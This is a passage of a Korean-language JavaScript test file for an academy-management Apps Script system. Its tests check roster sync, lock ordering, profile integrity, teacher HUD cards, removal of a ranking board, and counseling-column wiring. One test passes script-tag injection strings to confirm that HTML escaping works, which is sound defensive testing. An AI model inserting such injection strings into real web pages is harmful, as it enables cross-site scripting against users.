  assertOrder(sw, ['al.getRange(al.getLastRow() + 1', '적재 직후·메일 전 마감', 'adminMail(']); // [리뷰 M5] 적재→포인터→메일 — 메일 실패가 중복 적재를 만들지 않게(상단 클램프의 setProperty와 구분해 주석 마커 사용)
  assert.ok(sw.includes('val >= 1 && val <= 6') && sw.includes('val >= 0 && val <= 100'), '값 범위 검증 누락 — 차트 원본 오염 위험');
  assert.ok(sw.includes("'AL' + String(seq).padStart(3, '0')"), 'AL 채번(기존 최대 번호 잇기) 누락');
  assert.ok(sw.includes('미매칭'), '미매칭 통보 누락');
  assert.ok(section('function parentSweep()', 'function translateTopics_').includes("safeRun('sweepAcademicForm'"), '10분 스위프 배선 누락');
  assert.ok(section('function morningJobs()', 'function nightJobs()').includes("safeRun('academicFormSync'"), '아침 로스터 동기화 누락');
  assert.ok(code.includes("['학업폼URL', 'createAcademicForm'"), 'preflight 켜기 큐(폼 미생성 감시) 누락');
  const shared = section('function writeSharedCols_(', 'function syncProfiles()');
  assert.ok(shared.includes("kv['학업폼URL']") && shared.includes("kv['약점메모폼URL']"), '강사 행 폼 버튼 URL 배선 누락');
});

test('[v9.75] 만족도팩 켜기 큐 — 설문 폼 미생성·수강 등록 공백이 preflight에서 드러난다', () => {
  // v9.73 설문 폼은 유호님 ▶ 1회가 필요한데 v9.61 폼 감시 목록에서 빠져 있었다(안 하면 링크가 조용히 생략됨).
  assert.ok(code.includes("['설문폼URL틀', 'createSurveyForm'"), '설문 폼이 켜기 큐(폼 미생성 감시)에 없다');
  // v9.72 만료 안내는 enrollments가 비면 무비용 휴면 — 학생이 있는데 0행이면 "코드는 정상인데 아무도 모르는" 침묵이 된다.
  const pfl = section("const en = ss.getSheetByName('enrollments')", '// 4) class_stats');
  assert.ok(pfl.includes('cnt.student'), '학생 수 대조 없이 경고하면 개원 전 빈 로스터에서 오경보');
  assert.ok(pfl.includes('만료 D-14/D-3'), '만료 안내 침묵 경고 문구가 없다');
});

test('[09-02] 메신저 주간 점수는 정정 순계 — 밤에 정정된 초과 지급이 부풀려 나가지 않는다(codex P2 4d0fe949)', () => {
  const mj = fs.readFileSync(path.join(ROOT, '만족도팩.js'), 'utf8');
  const digest = mj.slice(mj.indexOf('function MJ_messengerDigest_('), mj.indexOf('function MJ_msgSection_('));
  /* 앵커 갱신 09-03 — 이 검사가 쓰인 뒤 master 가 같은 판정을 변수(`획득`)로 뺐다. 뜻·동작은 그대로고
   *   문구만 갈렸다. 두 줄로 나눈 이유: 판정식과 «그 판정이 합계에 걸렸나»는 따로 깨질 수 있다. */
  assert.ok(digest.includes("const 획득 = pts > 0 || rs.indexOf('정정') > -1;"),
    '메신저 점수의 «획득» 판정식이 없다 — 정정 행이 빠지면 +20P 가 +10P 를 부풀린다');
  assert.ok(digest.includes('if (획득 && pts !== 0) ptsW[sid]'),
    '«획득» 판정이 합계에 안 걸렸다 — 식만 있고 안 쓰이면 없는 것과 같다');
  // 상위 다이제스트(엔진_운영배치)와 같은 규약이어야 한다 — 한쪽만 고치면 이메일과 메신저가 다른 점수를 말한다
  const parent = section('const ptsW = {}, mvpW = {}, synW = {};', 'const mvpN = ');
  assert.ok(parent.includes('if (isE && pts !== 0) ptsW[sid]'), '상위 다이제스트 규약 앵커가 바뀌었다 — 메신저 미러도 같이 본다');
});

test('[09-02] 주간 워치독 — 의도된 미개통은 ✅ 도 ⚠️ 도 아닌 ⓘ 로 낸다(codex P2 3602c41d·9e616375)', () => {
  const wd = section('function systemWatchdog(', 'function buildSystemManifest()');
  /* 앵커 갱신 09-03 — 셋째 상태를 `null` 이 아니라 `'ⓘ'` 로 표현하도록 master 가 바꿨고, 제목에
   *   「건」까지 붙였다. 검사의 뜻(셋째 상태가 있나 · 미개통이 그것으로 찍히나 · 제목이 그 수를 세나)은 그대로다. */
  assert.ok(wd.includes("out.push((ok === 'ⓘ' ? 'ⓘ ' : ok ? '✅ ' : '⚠️ ') + msg)"), '세 번째 상태(ⓘ)가 없다');
  assert.ok(/add\('ⓘ', '교재연동 미개통/.test(wd), '교재연동 미개통이 ⓘ 가 아니다 — ✅ 로 찍히면 판정관 실행 0회가 «전부 정상»의 얼굴이 된다');
  assert.ok(!/add\(true, 'ⓘ/.test(wd), '✅ 접두에 ⓘ 를 손으로 붙인 옛 모양이 남아 있다');
  assert.ok(wd.includes("(info ? ' · ⓘ ' + info + '건' : '')"), '메일 제목이 정보 칸 수를 안 센다 — «전부 정상»에 섞인다');
});

test('[09-02] 인계 초안 발송 — 스크립트 잠금은 「발송중」 찜 왕복만 감싼다(역번역·Meta 전송은 잠금 밖 · codex P2 c4edf5b1)', () => {
  const ai = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8').replace(/\r\n/g, '\n');
  const fn = ai.slice(ai.indexOf('function 상담_초안발송_('), ai.indexOf('function 상담_확인화면본_('));
  const iLock = fn.indexOf('lock.tryLock(5000)'), iRel = fn.indexOf('lock.releaseLock()');
  assert.ok(iLock > -1 && iRel > iLock, '잠금이 없다');
  const i역 = fn.indexOf('상담_역번역_('), i전송 = fn.indexOf('상담_전송_(');
  assert.ok(i역 > -1 && i역 < iLock, '역번역(Claude 호출 · 수 초)이 잠금 안이다 — 학부모 웹훅이 상한 예약 tryLock(3000) 에서 밀려 인계된다');
  assert.ok(i전송 > iRel, 'Meta 전송이 잠금 안이다');
  const i찜 = fn.indexOf("'발송중 '");
  assert.ok(i찜 > iLock && i찜 < iRel, '「발송중」 찜이 잠금 안이 아니다 — 재클릭 두 번이 다 나간다');
  const i재확인 = fn.indexOf("indexOf('발송됨') === 0", iLock);
  assert.ok(i재확인 > iLock && i재확인 < iRel, '잠금 안에서 표식을 다시 읽지 않는다 — 잠금 밖에서 읽은 값으로 찜하면 두 클릭이 같이 통과한다');
  assert.ok(fn.includes('표식셀.setValue(이전표식)'), '전송 실패 때 찜을 안 되돌린다 — 실패한 초안이 영영 「발송중」이다');
});

test('[v9.71] 메신저 연결 스위프가 상담로그 실제 열 순서(시각·세션·발신·내용)와 맞는다', () => {
  // 상담AI.js가 쓰는 헤더와 만족도팩이 읽는 인덱스가 어긋나면 연결 요청이 영원히 접수되지 않는다(양쪽 파일 교차 계약).
  const ai = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8');
  // [v9.259 · Ⅰ-④] 헤더 정본이 골격 파일로 이관됐다 — 선언을 그쪽에서 읽는다(사본 검사 금지).
  const 골격Src = fs.readFileSync(path.join(ROOT, '엔진_셋업확장.js'), 'utf8');
  const head = 골격Src.match(/const 상담로그_HEADERS = \[([^\]]+)\]/);
  assert.ok(head, '상담로그_HEADERS 선언(엔진_셋업확장.js)을 찾지 못함');
  const cols = head[1].split(',').map(s => s.trim().replace(/'/g, ''));
  assert.deepEqual(cols.slice(0, 4), ['시각', '세션', '발신', '내용'], '상담로그 앞 4열이 바뀌면 MJ_msgLinkSweep_의 psid/발신/내용 인덱스가 어긋난다');
  const mj = fs.readFileSync(path.join(ROOT, '만족도팩.js'), 'utf8');
  const sweep = mj.slice(mj.indexOf('function MJ_msgLinkSweep_('), mj.indexOf('function MJ_canSendNow_('));
  assert.ok(sweep.includes('last - from, 4'), '상담로그 4열 읽기가 아니다');
  assert.ok(sweep.includes("who !== 'user'"), "발신 'user' 필터가 없다 — 봇 발화까지 학생ID로 오인 접수");
  assert.ok(sweep.includes("psid === 'anon'"), 'anon(자체폼 세션) 제외가 없다 — psid 없는 세션이 연결 대기로 쌓인다');
  assert.ok(ai.includes("상담_기록_(세션, 'user'"), "상담AI가 'user' 발신으로 기록하지 않으면 스위프가 아무것도 못 잡는다");
});

test('[v9.76] 리텐션 레이더·학생수는 role=student만 — 원장·강사·학부모 오염 차단', () => {
  // 07-28 실측: 콕핏 "관심 필요 13명"에 원장(director)·강사(teacher)·학부모(parent)가 섞여 있었다.
  // profiles 실제 구성은 학생 9 + 원장1 + 강사1 + 학부모2 = 13행 → 전 행을 학생으로 집계하던 결함.
  const body = section('// [v9.14] 📡 리텐션 신호', '// [v9.20] 오늘의알림');
  assert.ok(body.includes("const isStu76 = r[3] === 'student'"), '리텐션 신호에 role 필터가 없다');
  assert.ok(body.includes("if (sig !== '🟢' && isStu76)"), '레이더 목록(콕핏·브리핑·AI 멘트 소스)에 비학생이 들어간다');
  assert.ok(body.includes('if (isStu76 && (rec2.a14'), '케어 사각 목록에 비학생이 들어간다');
  assert.ok(body.includes("radarOut.push([isStu76 ?"), '비학생 행에도 신호 문자열이 찍힌다(학부모가 자기 행에서 볼 여지)');
  // 학생수는 role=student 집합 길이여야 한다(구 전체 행 수 count는 제거)
  assert.ok(code.includes("setState(st, '학생수', curStuIds.length)"), "'학생수'가 role=student 기준이 아니다");
  assert.ok(!코드정제.includes('const count = pfData.filter(r => r[0]).length'), '구 전체 행 수 count가 살아 있다');
});

test('[v9.77] profiles 무결성 감시 — 유령 행·중복 ID·무효 role을 매일 자동 발각', () => {
  // 2026-07-28 실측: Glide 반 상세 화면에 Edit(class_stats)·+Add(profiles 생 행) 잔재 —
  // 레이아웃 구멍은 편집기에서 닫았지만, 다시 열려도 오염을 기계가 잡는 층이 없었다.
  // 기존 preflight 루프는 `if (!r[0]) return`이라 user_id 공란 유령 행을 구조적으로 못 본다.
  const core = loadFunction('function profilesIntegrityCore_', '\nfunction aiFeedbackHealth_',
    'profilesIntegrityCore_', {});
  // 정상: 4역할 + 완전 빈 행(무해)
  const okRes = core([
    ['SYNK-001', '김재헌', '', 'student', '정규반1', '', 'a@b.c'],
    ['SYNK-T01', '강사', '', 'teacher', '정규반1', '', 't@b.c'],
    ['SYNK-D01', '원장', '', 'director', '', '', 'd@b.c'],
    ['SYNK-P01', '학부모', '', 'parent', '', '', 'p@b.c'],
    ['', '', '', '', '', '', ''],
  ]);
  assert.equal(okRes.clean, true, '정상 데이터가 오탐된다');
  // 유령: user_id 공란 + 내용 있음(앱 Add 폼이 만드는 형태)
  const ghostRes = core([['', '홍길동', '', '', '', '', '']]);
  assert.equal(ghostRes.ghost.length, 1, 'user_id 공란 유령 행을 못 잡는다');
  assert.ok(ghostRes.ghost[0].includes('홍길동'), '유령 행 라벨에 단서(이름)가 없다');
  // 중복 ID + 무효 role
  const dupRes = core([
    ['SYNK-001', 'A', '', 'student', '', '', 'a@b.c'],
    ['SYNK-001', 'B', '', 'studnet', '', '', 'b@b.c'],
  ]);
  assert.equal(dupRes.dupId.length, 1, 'user_id 중복을 못 잡는다');
  assert.equal(dupRes.badRole.length, 1, '무효 role(오타)을 못 잡는다');
  // 소비처 3면: 야간 배치(매일)·주간 워치독·preflight 보강이 전부 배선돼 있어야 한다
  const night = section('function nightJobs()', '// [v9.28] 완주 마커');
  assert.ok(night.includes("safeRun('profilesIntegrityNightly', profilesIntegrityNightly_)"), 'nightJobs에 야간 무결성 감시가 없다');
  const wd = section('function systemWatchdog(', "const report = '🛡️ SYNK 시스템 워치독");
  assert.ok(wd.includes('profilesIntegrityScan_(ss)'), '주간 워치독에 무결성 항목이 없다');
  const pfChk = section('// 2) profiles 진단', '// [v9.40] 잔액 음수 검사');
  assert.ok(pfChk.includes('pi.ghost'), 'preflight가 여전히 유령 행을 못 본다(!r[0] 스킵만 존재)');
  // 통보는 동일 내용 dedup(매일 같은 메일 소음 금지) + 해소 시 키 삭제
  const notif = section('function profilesIntegrityNightly_', '\nfunction aiFeedbackHealth_');
  assert.ok(notif.includes("props.getProperty(KEY) === sig) return"), '동일 이상 재통보 dedup이 없다');
  assert.ok(notif.includes('props.deleteProperty(KEY)'), '해소 시 시그니처 키를 지우지 않는다(재발 감지 불가)');
});

test('[v9.78] 강사 반 HUD — 빈 상태 카드·명단 캡·사정권 경계·이스케이프·헤더 동기', () => {
  // 유호 07-28 "반 탭 만들다 만 느낌" 리디자인. 원칙: 카드 1장=질문 1개 + 빈 상태도 카드(조용한 공백 금지).
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const deps = { escHtml_: esc, CARD_FONT: "font-family:test;", CARD_WEBFONT: '' };
  const load = (name) => loadFunction('function buildRaidCard_', '\n// [v9.14] 📊 월간 경영 리포트', name, deps);
  const brief = load('buildBriefHud_'), rows = load('hudBriefRows_'), crown = load('buildCrownHud_');
  const raid = load('buildRaidCard_'), routine = load('buildRoutineHud_'), detail = load('buildClassHudDetail_');
  // ① 빈 미션 = dashed 빈 상태 + 클리어 배지(카드가 사라지지 않는다)
  const emptyBrief = brief('정규반1', {});
  assert.ok(emptyBrief.includes('특이사항 없음') && emptyBrief.includes('클리어'), '빈 미션이 빈 상태 카드로 렌더되지 않는다');
  // ② 명단 캡 — 케어 사각 8명이면 6명+외 2명(행 폭발 방지, 구 v9.15 전원 join 결함 재발 금지)
  const capped = rows({ blind: ['a','b','c','d','e','f','g','h'] });
  assert.ok(capped[0][1].includes('외 2명'), '케어 사각 명단이 캡 없이 전원 나열된다');
  // ③ errs 계약 — 사전 이스케이프 HTML 통과(태그 보존), 이름 계열은 내부 이스케이프
  const injected = rows({ errs: ['<b>홍길동</b> 받침'], bday: ['<img>'] });
  assert.ok(injected.some(r => r[1].includes('<b>홍길동</b>')), 'errs(사전 이스케이프 HTML)가 재이스케이프로 깨진다');
  assert.ok(injected.some(r => r[1].includes('&lt;img&gt;')), '생일 이름이 이스케이프 없이 침투한다');
  // ④ 왕관 — 학생 0명·전원 수혜·7명 미수혜 모두 상태 카드
  assert.ok(crown('반', 0, 0, []).includes('비어 있어요'), '학생 0명 반이 빈 상태 카드가 아니다');
  assert.ok(crown('반', 3, 3, []).includes('전원 수혜'), '전원 수혜가 축하 카드가 아니다');
  assert.ok(crown('반', 1, 8, ['a','b','c','d','e','f','g']).includes('외 1명'), '미수혜 pill 캡이 없다');
  // ⑤ 레이드 — 휴식주·사정권 경계(left==stuN×10 발동, +1 미발동)·격파
  assert.ok(raid('반', 0, 0, false, 5).includes('휴식주'), 'goal 0이 휴식주 카드가 아니다');
  assert.ok(raid('반', 60, 10, false, 5).includes('사정권'), '경계값(left=50=5×10)에서 사정권 콜아웃이 안 뜬다');
  assert.ok(!raid('반', 61, 10, false, 5).includes('사정권'), '사정권 밖(left=51)인데 콜아웃이 뜬다');
  assert.ok(raid('반', 60, 60, false, 5).includes('격파!'), 'dmg≥goal 격파 표기가 없다');
  // ⑥ 루틴 — 4/4 골드 올클리어·2/4 진행 카운트
  assert.ok(routine('반', { hw: 1, mvp: 1, syn: 1 }, true).includes('올클리어'), '4/4가 올클리어로 표기되지 않는다');
  assert.ok(routine('반', { hw: 1 }, true).includes('>2<'), '완료 카운트(2/4)가 헤더에 없다');
  // ⑦ 상세 헤더 스탯 = hudBriefRows_와 동일 소스(카운트·본문 불일치 불가) + 반명 이스케이프
  const d = detail('<정규반>', { bday: ['a'], blind: ['b'] }, {}, false, { got: 0, total: 1, notYet: ['a'] }, { goal: 100, dmg: 30, stuN: 3 }, '7월 28일');
  assert.ok(d.indexOf('>2</span><span style="font-size:12px;font-weight:700;color:rgba(255,255,255,.45);">건') > -1, '헤더 미션 카운트가 미션 행 수와 안 맞는다');
  assert.ok(d.includes('&lt;정규반&gt;'), '헤더 반명이 이스케이프되지 않는다');
  assert.ok(d.includes('SYNK CLASS HUD') && d.includes('HP 70'), '헤더 스탯 스트립(HUD 라벨·보스 HP)이 없다');
  // ⑧ 배선 — calcAll 강사 팩이 HUD 빌더를 쓰고 14열이 대시보드 1장을 기록한다
  const wiring = section('crewCols = Object.keys(cls).sort().map', 'writeIfChanged(cs, 2, 9, crewCols)');
  assert.ok(wiring.includes('buildBriefHud_(c') && wiring.includes('buildRoutineHud_(c') && wiring.includes('buildCrownHud_(c'), '9·11·12열이 구 줄글 카드다');
  assert.ok(wiring.includes('buildClassHudDetail_(c'), '14열 HUD 대시보드 호출이 없다');
  assert.ok(code.includes('writeIfChanged(cs, 2, 14, hudDetailRows)'), '14열 기록이 hudDetailRows가 아니다');
  assert.ok(code.includes('buildRaidCard_(c, raidGoal[c] || 0, weekDmg[c] || 0, !!raidWin[c], cls[c].n)'), '13열에 stuN(사정권 흡수)이 전달되지 않는다');
});

test('[v9.78·리뷰 반영] HUD 보강 — AI 이스케이프·모순 억제·absent 캡·10열 라이브 소스·행수 계약', () => {
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const deps = { escHtml_: esc, CARD_FONT: "font-family:test;", CARD_WEBFONT: '' };
  const load = (name) => loadFunction('function buildRaidCard_', '\n// [v9.14] 📊 월간 경영 리포트', name, deps);
  const brief = load('buildBriefHud_'), rows = load('hudBriefRows_');
  // ① AI 브리핑 이스케이프(유일 XSS 잔여면이라는 리뷰 지적) + 미션 0건일 때 "특이사항 없음"과 동시 출력 모순 억제
  const aiOnly = brief('반', { ai: '<script>x</script>' });
  assert.ok(aiOnly.includes('&lt;script&gt;'), 'AI 브리핑이 이스케이프 없이 침투한다');
  // 🚫 `코드만()` 대상 아님 — `aiOnly` 는 `brief()` 가 **그려 낸 HTML**이지 소스 글이 아니다.
  assert.ok(!aiOnly.includes('특이사항 없음'), 'AI 브리핑과 "특이사항 없음"이 동시 출력된다(모순)');
  // ② absent 캡 5(구 slice(0,5) 하위호환)
  const ab = rows({ absent: ['a','b','c','d','e','f','g'] });
  assert.ok(ab[0][1].includes('외 2명'), '어제 결석 캡(5명+외 n)이 없다');
  // ③ 10열 격파찬스 = 라이브 소스(goal−weekDmg) — 죽은 raidLeft 스냅샷(금·일만 갱신) 회귀 금지
  const wiring = section('crewCols = Object.keys(cls).sort().map', 'writeIfChanged(cs, 2, 9, crewCols)');
  assert.ok(wiring.includes('(raidGoal[c] || 0) - (weekDmg[c] || 0)'), '10열이 라이브 소스가 아니다');
  assert.ok(!코드만(wiring).includes('raidLeft[c]'), '10열이 죽은 raidLeft 스냅샷(월~목 발동 불가)을 다시 쓴다');
  // ④ hudDetailRows가 crewCols와 같은 map 안에서 push — 행 순서·개수 원자 동기
  assert.ok(wiring.includes('hudDetailRows.push('), '14열 행 생성이 9열 map 밖으로 이탈했다(반 순서 어긋남 위험)');
  // ⑤ 강사가 실행 불가한 안내 금지 — '해결' 표기는 시트 접근자만 가능
  assert.ok(!코드정제.includes("'해결'로 바꾸면 다음 브리핑부터"), '강사가 수행할 수 없는 풋노트 안내가 남아 있다');
});

test('[08-27 유호 지시] 🚫 전교 순위표가 되살아나지 않는다 — 비교 장치 폐지', () => {
  // 유호 08-27 「전교 실명 순위표 이거 없애자. 비교하는거 최대한 없애자.
  //   일반적으로 과제 점수로 분류하는 랭킹 시스템은 전부 삭제해줘.」
  // 구 v9.81 카드가 하던 것: 다른 학생 «실명» 포디움 · 1위 대비 «격차 게이지» · 「왕좌 수성 중」 넛지.
  // 🔑 이 검사는 «없음»을 지킨다. 되살리려면 여기부터 지워야 하므로 실수로는 못 되살린다.
  // 🔑 «주석을 뺀» 코드로 잰다 — 안 그러면 위의 은퇴 선언 자체가 병으로 잡힌다(같은 날 정본검사에서 겪은 무늬).
  assert.ok(!코드정제.includes('function buildRankBoardHtml_'), '전교 순위표 빌더가 되살아났다');
  assert.ok(!코드정제.includes('leagueRows'), '리그 순위 스냅샷(leagueRows)이 되살아났다');
  assert.ok(!코드정제.includes('rankMap'), '학생 줄 세우기(rankMap)가 되살아났다');
  assert.ok(!코드정제.includes('왕좌'), '「왕좌」 문구가 되살아났다');
  assert.ok(!코드정제.includes('SYNK LEAGUE'), 'SYNK LEAGUE 보드가 되살아났다');

  // 🔑 열은 «예약을 유지»한다 — 비우고 놓으면 뒤 블록이 점거한다(열 충돌 사고 2건의 재발 경로).
  //   그리고 빈 문자열을 «계속 써야» 라이브 시트에 이미 굳은 옛 카드가 실제로 지워진다.
  assert.ok(code.includes("rankBoardOut.push([''])"), '빈 칸 쓰기가 없다 — 라이브에 굳은 옛 카드가 영영 남는다');
  assert.ok(code.includes('writeIfChanged(pf, 2, 119, rankBoardOut)'), 'DO119 쓰기가 사라졌다 — 옛 카드가 안 지워진다');
  assert.ok(code.includes("'구랭킹보드_비움'"), 'DO119 열 예약이 사라졌다 — 뒤 블록이 이 자리를 점거한다');

  // R열 「월간랭킹」도 빈 칸으로 간다 — 이 카드가 그 열의 유일한 소비자였다(08-27 실측).
  assert.ok(code.includes("return [t, mPts, '', isStu9 ? sceneIdx"), 'R열에 순위가 다시 쓰인다(셋째 원소가 빈 칸이 아니다)');

  assertOrder(section('const csLast = cs.getLastRow()', 'writeIfChanged(cs, 2, 1, csOut)'),
    ['cs.getMaxColumns() < 16', 'clearContent()']); // 폭 보장이 유령 클리어보다 먼저
});

test('[v9.81] 반 목록 카드 2열 + HUD 총원 필 — 유호 07-31 반 리스트·총원 지적', () => {
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const deps = { escHtml_: esc, CARD_FONT: 'font-family:test;', CARD_WEBFONT: '' };
  const detail = loadFunction('function buildRaidCard_', '\n// [v9.14] 📊 월간 경영 리포트', 'buildClassHudDetail_', deps);
  // ① 반 상세 HUD 헤더 총원 필 — stuN이 이미 전달되고 있어 Glide 조립 0으로 적용된다
  const d = detail('정규반1', {}, {}, false, { got: 0, total: 0, notYet: [] }, { goal: 0, dmg: 0, stuN: 12 }, '7월 31일');
  assert.ok(d.includes('👥 12명'), 'HUD 헤더 총원 필이 없다');
  // ② 15·16열 — 헤더 보장·기록·유령 행 클리어 확장(반 감소 시 15·16열 잔존 방지)
  assert.ok(code.includes("cs.getRange(1, 15).getValue()) !== '반카드요약'") && code.includes("cs.getRange(1, 16).getValue()) !== '반몬스터이미지'"), '15·16열 헤더 보장이 없다');
  assert.ok(code.includes('writeIfChanged(cs, 2, 15, listCards)'), '반 목록 카드 기록이 없다');
  assert.ok(code.includes('csLast - 1 - csOut.length, 16).clearContent()'), '유령 행 클리어가 16열로 확장되지 않았다');
  // ③ 요약 구성 — 총원(8번 지적과 호응)·보스 3상태. [함께한날 막3] 첫 토큰(E열)은 classMonster 가 아니라
  //   «함께한 날 합»(classDaysToken_) — 같은 판정을 csOut 5열이 공유한다(판정 분열 방지 축은 그대로).
  const blk = section("cs.getRange(1, 15).getValue()) !== '반카드요약'", 'writeIfChanged(cs, 2, 15, listCards)');
  assert.ok(blk.includes("'👥 ' + v.n + '명'") && blk.includes('🏖️ 보스 휴식주') && blk.includes('🏆 이번 주 보스 격파!'), '요약 구성(총원·보스 상태)이 빠졌다');
  // [v9.87] 라이브 조립 계약 — Description = 「반몬스터(E열)」+「반카드요약」 2토큰(Glide가 공백 없이 잇는다).
  //   요약은 ' · '로 시작해야 "🤝 함께한 날 12 · 👥 4명 · ⚔️…"로 이어진다. E열 값을 다시 넣으면 카드에 두 번 나온다.
  assert.ok(blk.includes("' · ' + ['👥 ' + v.n + '명'"), '요약이 구분자로 시작하지 않는다 — E열 토큰과 붙어 버린다');
  assert.ok(code.includes('classDaysToken_(c)'), 'csOut 5열이 함께한 날 토큰을 쓰지 않는다(15열 카드와 판정 분열)');
  assert.ok(!코드만(code).includes('function classMonster'), '구 classMonster(반 몬스터 판정)가 되살아났다 — contents monster 행이 사라지면 전 반이 무너지는 배선(설계 §8-⑬)');
  // [함께한날 막3] 이미지 토큰(16열)은 빈 값을 «계속» 써야 라이브에 굳은 옛 몬스터 그림이 지워진다
  assert.ok(blk.includes("filter(String).join(' · '), '']"), '16열 이미지 자리가 빈 값 지속 쓰기가 아니다');
});

test('[v9.84] 상담 배선 — 읽기 폭 동적·이름 해석·DT124~DX128 기입·점거 가드', () => {
  const body = section('function syncProfiles()', '/* ===================== 매일 백업');
  assert.ok(body.includes('Math.max(62, src.getLastColumn())'), '상담 읽기 폭이 62 고정 — v18.4 증분(선호그룹 등)을 통째로 못 읽는다');
  assert.ok(body.includes("cv(row, '선호그룹')") && body.includes("cv(row, 'TOPIK목표기한')"), '증분 문항 헤더 이름 해석이 없다(열 이동에 취약)');
  assert.ok(body.includes("consultBlobField_(cv(row, '📝자유서술→노션'), '한국어고충')"), '자유서술 blob 고충 추출이 없다');
  /* 점거 가드 — 24시간 내 열 충돌 계열 사고 2건(오늘의알림 덮임·DO119 선점)의 회귀 장치.
   * [궤적] 두 번째 블록(진로 4열)이 붙으면서 손코딩 12줄이 공용 통로 profilesBlockWrite_로 승격됐다.
   *   그래서 검사도 「syncProfiles 안에 가드가 있나」가 아니라 **「기입이 통로를 지나나」**를 본다 —
   *   통로를 안 지나는 기입이 하나라도 생기면 그게 다음 사고다. */
  assert.ok(body.includes("profilesBlockWrite_(dst, 124, DT_HEADS, quint, '상담열충돌'"), 'DT124 기입이 공용 통로를 지나지 않는다');
  const guard = section('function profilesBlockWrite_(', 'function syncProfiles()');
  assertOrder(guard, ['const clash', 'return false', 'writeIfChanged(dst, 2, start, rows)', 'clearContent()']);
  assert.ok(guard.includes("adminMail('[SYNK] ⚠️ ' + label + ' 열 충돌"), '점거 충돌 시 상태 변화 1회 알림이 없다');
  assert.ok(body.includes("['상담취향', '상담목표', '입학TOPIK', '상담고충', '페이스라인']"), 'DT_HEADS 정본 배열이 변형됨 — 시트·문서·레지스트리 함께 갱신 필요');
  assert.ok(body.includes("[e.taste || '', e.cGoal || '', e.topik0 || '', e.pain || '', e.pace || '']"), 'quint 5열 구성이 변형됨');
});

test('[v9.84] 상담 디테일 열 비침범 — DT124~DX128이 공유 블록(SHARED·2·3 자동 검출)과 겹치지 않는다', () => {
  /* [F080] 블록 목록은 손으로 적지 않는다 — 여기와 v9.74 레지스트리 검사가 각자 손 목록을 들고 있다가
   *   한쪽만 4차 블록을 아는 상태로 갈라졌다. 이제 둘 다 sharedBlocks 하나에서 파생한다. */
  const blocks = sharedBlocks(code);
  assert.ok(blocks.length >= 2, '공유 블록 상수를 찾지 못함 — 검사 자체가 무력화됨');
  for (let c = 124; c <= 128; c++) {
    blocks.forEach(b => assert.ok(!(c >= b.start && c <= b.end),
      b.name + '(' + b.start + '~' + b.end + ')이 상담 디테일 열 ' + c + '을 침범 — 리뷰 B1 계열 재발'));
  }
  assert.ok(code.includes('profilesBlockWrite_(dst, 124, DT_HEADS, quint,'), 'DT124 기입 코드가 사라짐 — 이 검사·레지스트리 갱신 필요');
});

test('[v9.84] 페이스라인·blob 추출 — 실행 검증(경계·과장 금지 포함)', () => {
  const blobF = loadFunction('function consultBlobField_', 'function syncProfiles()', 'consultBlobField_', {});
  // [v9.181] consultPace_ 가 공용 통로 미정값_(Code.js)를 지난다 — 「TOPIK 아직 미정까지 약 48주」 차단
  const paceF = loadFunction('function consultBlobField_', 'function syncProfiles()', 'consultPace_',
    { 미정값_: (v) => !v || /미정|모름|모르|정하지/.test(String(v)) });
  const b = '[나의 다짐 노트] 꿈이 있다\n중간 줄\n\n[한국어고충] 발음이 어렵고\n암기가 약해요\n\n[기타 질문] 없음';
  assert.equal(blobF(b, '한국어고충'), '발음이 어렵고\n암기가 약해요'); // 문단 내 단일 개행은 값의 일부
  assert.equal(blobF(b, '없는문항'), '');
  assert.equal(blobF('', '한국어고충'), '');
  const now = new Date(2026, 7, 1); // 2026-08-01 기준
  const p = paceF('3~4급', '2027-06', '1~2시간', now);
  assert.ok(p.indexOf('🎯 TOPIK 3~4급까지 약 ') === 0 && p.includes('하루 1~2시간'), '페이스라인 형식 이상: ' + p);
  const wk = Number((p.match(/약 (\d+)주/) || [])[1]);
  assert.ok(wk >= 43 && wk <= 48, '남은 주 역산 이상(2026-08-01→2027-06 말일): ' + wk);
  assert.equal(paceF('3~4급', '2025-06', '1~2시간', now), '', '기한 경과인데 침묵하지 않는다(사람 상담 영역)');
  assert.equal(paceF('3~4급', '기한 미정', '', now), '', '파싱 불가인데 침묵하지 않는다');
  assert.equal(paceF('3~4급', '2033-06', '', now), '', '5년+ 오입력인데 침묵하지 않는다');
  assert.equal(paceF('', '2027-06', '', now), '', '목표 없음인데 침묵하지 않는다');
  assert.ok(paceF('5~6급', '2027년 3월', '', now).includes('약 '), '한국식 연월(2027년 3월) 파싱 실패');
  // 🚫 `코드만()` 대상 아님 — `p` 는 `paceF()` 가 **내놓은 학생용 문장**이지 소스 글이 아니다.
  ['도달권', '합격', '보장', '가능'].forEach(wd => assert.ok(!p.includes(wd), '페이스라인에 보장성 단어 침투: ' + wd));
});

test('[v9.84] 콜드스타트 폴백 사슬 — 소비층 4곳 통일·학생 소유 열은 읽기만', () => {
  const stu = section('function aiStudents_', 'function aiWeakMap_');
  assert.ok(stu.includes('Math.min(128, pf.getMaxColumns())'), 'aiStudents_ 폭이 128이 아니다(상담 디테일 못 읽음)');
  ['r[123]', 'r[124]', 'r[125]', 'r[126]'].forEach(m => assert.ok(stu.includes(m), 'aiStudents_에 ' + m + ' 로드가 없다'));
  assert.ok(code.includes('s.fav || s.taste'), '데일리 최애 폴백(DA105‖상담취향)이 없다');
  assert.ok(code.includes('s.dream || s.cGoal || s.vision'), '목표 폴백 사슬(드림‖상담목표‖비전)이 없다');
  assert.ok(code.includes("'입학 자기보고: ' + s.pain"), '데일리 약점→상담고충 폴백이 없다');
  assert.ok(code.includes("(s.dream || s.cGoal) ? '(목표: '"), '웰컴 스토리 목표 폴백이 없다');
  assert.ok(code.includes('입학 때 TOPIK 실측'), '미래편지 0점 좌표(입학TOPIK) 축이 없다');
  assert.ok(code.includes('직접 비교 단정은 금지'), '미래편지 0점 좌표에 급수 체계 차이 가드 문구가 없다');
  assert.ok(code.includes('const goalTxt = o.dream || o.cGoal'), '여정카드 목표줄 폴백이 없다');
  assert.ok(code.includes('o.pace ?'), '여정카드 페이스라인 렌더가 없다');
});

test('[v9.98→08-26] 동의 마커 단일 소스 — 노션 소각 뒤에도 살아야 하는 셋', () => {
